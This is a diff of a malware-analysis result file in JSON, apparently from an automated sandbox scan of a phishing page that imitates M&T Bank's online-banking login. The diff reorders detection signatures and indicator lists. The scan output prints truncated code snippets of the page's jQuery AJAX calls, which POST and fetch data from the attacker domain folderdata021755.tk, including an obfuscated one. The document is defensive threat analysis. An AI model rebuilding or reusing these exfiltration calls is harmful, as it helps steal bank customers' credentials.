@@ -38,6 +38,28 @@
       },
       {
         "auto_collapse": false,
+        "body": "JavaScript sends a network request via AJAX and jQuery\n\t\t$.ajax({\"dataType\":\"JSON\",\"url\":\"https://folderdata021755.tk/d1.php\",\"type\":\"POST\",\"data\":{\"fn\":\"cli...\n\t\t$.ajax({\"url\":\"https://folderdata021755.tk/adminPanel/returnJson.php?session=127.0.0.1\",\"method\":\"GE...\n\t\t$.ajax({\"url\":\"https://folderdata021755.tk/adminPanel/returnJson.php?session=127.0.0.1\",\"method\":\"GE...",
+        "body_format": "TEXT",
+        "classification": "TLP:W",
+        "depth": 1,
+        "heuristic": {
+          "attack_ids": [],
+          "frequency": 1,
+          "heur_id": 3,
+          "score": 10,
+          "score_map": {
+            "ajax_network_request": 10
+          },
+          "signatures": {
+            "ajax_network_request": 1
+          }
+        },
+        "tags": {},
+        "title_text": "Signature: AJAXNetworkRequest",
+        "zeroize_on_tag_safe": false
+      },
+      {
+        "auto_collapse": false,
         "body": "JavaScript sends a network request via jQuery\n\t\t$.getJSON(https://folderdata021755.tk/ads.php,function(_0x244311){var _0x4771b7=_0x1a3571,_0x5d510e=...",
         "body_format": "TEXT",
         "classification": "TLP:W",
@@ -60,7 +82,7 @@
       },
       {
         "auto_collapse": false,
-        "body": "JavaScript sends a network request\n\t\tXMLHttpRequest[280].send()\n",
+        "body": "JavaScript sends a network request\n\t\tXMLHttpRequest[279].send()\n",
         "body_format": "TEXT",
         "classification": "TLP:W",
         "depth": 1,
@@ -78,28 +100,6 @@
         },
         "tags": {},
         "title_text": "Signature: NetworkRequest",
-        "zeroize_on_tag_safe": false
-      },
-      {
-        "auto_collapse": false,
-        "body": "JavaScript sends a network request via AJAX and jQuery\n\t\t$.ajax({\"dataType\":\"JSON\",\"url\":\"https://folderdata021755.tk/d1.php\",\"type\":\"POST\",\"data\":{\"fn\":\"cli...\n\t\t$.ajax({\"url\":\"https://folderdata021755.tk/adminPanel/returnJson.php?session=127.0.0.1\",\"method\":\"GE...\n\t\t$.ajax({\"url\":\"https://folderdata021755.tk/adminPanel/returnJson.php?session=127.0.0.1\",\"method\":\"GE...",
-        "body_format": "TEXT",
-        "classification": "TLP:W",
-        "depth": 1,
-        "heuristic": {
-          "attack_ids": [],
-          "frequency": 1,
-          "heur_id": 3,
-          "score": 10,
-          "score_map": {
-            "ajax_network_request": 10
-          },
-          "signatures": {
-            "ajax_network_request": 1
-          }
-        },
-        "tags": {},
-        "title_text": "Signature: AJAXNetworkRequest",
         "zeroize_on_tag_safe": false
       },
       {
@@ -148,7 +148,7 @@
       },
       {
         "auto_collapse": false,
-        "body": "[{\"ioc_type\": \"domain\", \"ioc\": \"onlinebanking.mtb.com\"}, {\"ioc_type\": \"uri\", \"ioc\": \"https://onlinebanking.mtb.com/login/mtbsignon\"}, {\"ioc_type\": \"uri_path\", \"ioc\": \"/login/mtbsignon\"}, {\"ioc_type\": \"domain\", \"ioc\": \"usps.com\"}, {\"ioc_type\": \"domain\", \"ioc\": \"i.ibb.co\"}, {\"ioc_type\": \"uri\", \"ioc\": \"https://i.ibb.co/hgrxws2/tumblr-o8stot-saqr1ul8y65o1-1280.gif\"}, {\"ioc_type\": \"uri_path\", \"ioc\": \"/hgrxws2/tumblr-o8stot-saqr1ul8y65o1-1280.gif\"}, {\"ioc_type\": \"domain\", \"ioc\": \"folderdata021755.tk\"}, {\"ioc_type\": \"domain\", \"ioc\": \"cdn.jsdelivr.net\"}, {\"ioc_type\": \"uri\", \"ioc\": \"https://cdn.jsdelivr.net/npm/bootstrap@4.2.1/dist/css/bootstrap.min.css\"}, {\"ioc_type\": \"uri_path\", \"ioc\": \"/npm/bootstrap@4.2.1/dist/css/bootstrap.min.css\"}, {\"ioc_type\": \"uri\", \"ioc\": \"https://folderdata021755.tk\"}, {\"ioc_type\": \"uri\", \"ioc\": \"https://folderdata021755.tk/d1.php\"}, {\"ioc_type\": \"uri_path\", \"ioc\": \"/d1.php\"}, {\"ioc_type\": \"uri\", \"ioc\": \"https://folderdata021755.tk/ads.php\"}, {\"ioc_type\": \"uri_path\", \"ioc\": \"/ads.php\"}, {\"ioc_type\": \"ip\", \"ioc\": \"127.0.0.1\"}, {\"ioc_type\": \"uri\", \"ioc\": \"https://folderdata021755.tk/adminpanel/returnjson.php?session=127.0.0.1\"}, {\"ioc_type\": \"uri_path\", \"ioc\": \"/adminpanel/returnjson.php?session=127.0.0.1\"}, {\"ioc_type\": \"uri_path\", \"ioc\": \"?load=1&session='+window['ip']\"}]",
+        "body": "[{\"ioc_type\": \"domain\", \"ioc\": \"onlinebanking.mtb.com\"}, {\"ioc_type\": \"uri\", \"ioc\": \"https://onlinebanking.mtb.com/login/mtbsignon\"}, {\"ioc_type\": \"uri_path\", \"ioc\": \"/login/mtbsignon\"}, {\"ioc_type\": \"domain\", \"ioc\": \"usps.com\"}, {\"ioc_type\": \"domain\", \"ioc\": \"i.ibb.co\"}, {\"ioc_type\": \"uri\", \"ioc\": \"https://i.ibb.co/hgrxws2/tumblr-o8stot-saqr1ul8y65o1-1280.gif\"}, {\"ioc_type\": \"uri_path\", \"ioc\": \"/hgrxws2/tumblr-o8stot-saqr1ul8y65o1-1280.gif\"}, {\"ioc_type\": \"domain\", \"ioc\": \"cdn.jsdelivr.net\"}, {\"ioc_type\": \"domain\", \"ioc\": \"folderdata021755.tk\"}, {\"ioc_type\": \"uri\", \"ioc\": \"https://cdn.jsdelivr.net/npm/bootstrap@4.2.1/dist/css/bootstrap.min.css\"}, {\"ioc_type\": \"uri_path\", \"ioc\": \"/npm/bootstrap@4.2.1/dist/css/bootstrap.min.css\"}, {\"ioc_type\": \"uri\", \"ioc\": \"https://folderdata021755.tk\"}, {\"ioc_type\": \"uri\", \"ioc\": \"https://folderdata021755.tk/d1.php\"}, {\"ioc_type\": \"uri_path\", \"ioc\": \"/d1.php\"}, {\"ioc_type\": \"uri\", \"ioc\": \"https://folderdata021755.tk/ads.php\"}, {\"ioc_type\": \"uri_path\", \"ioc\": \"/ads.php\"}, {\"ioc_type\": \"ip\", \"ioc\": \"127.0.0.1\"}, {\"ioc_type\": \"uri\", \"ioc\": \"https://folderdata021755.tk/adminpanel/returnjson.php?session=127.0.0.1\"}, {\"ioc_type\": \"uri_path\", \"ioc\": \"/adminpanel/returnjson.php?session=127.0.0.1\"}, {\"ioc_type\": \"uri_path\", \"ioc\": \"?load=1&session='+window['ip']\"}]",
         "body_format": "TABLE",
         "classification": "TLP:W",
         "depth": 0,
@@ -167,8 +167,8 @@
                 "onlinebanking.mtb.com",
                 "usps.com",
                 "i.ibb.co",
-                "folderdata021755.tk",
-                "cdn.jsdelivr.net"
+                "cdn.jsdelivr.net",
+                "folderdata021755.tk"
               ],
               "ip": [
                 "127.0.0.1"
@@ -249,6 +249,13 @@
         "attack_ids": [],
         "heur_id": 3,
         "signatures": [
+          "ajax_network_request"
+        ]
+      },
+      {
+        "attack_ids": [],
+        "heur_id": 3,
+        "signatures": [
           "jquery_network_request"
         ]
       },
@@ -257,13 +264,6 @@
         "heur_id": 3,
         "signatures": [
           "network_request"
-        ]
-      },
-      {
-        "attack_ids": [],
-        "heur_id": 3,
-        "signatures": [
-          "ajax_network_request"
         ]
       },
       {
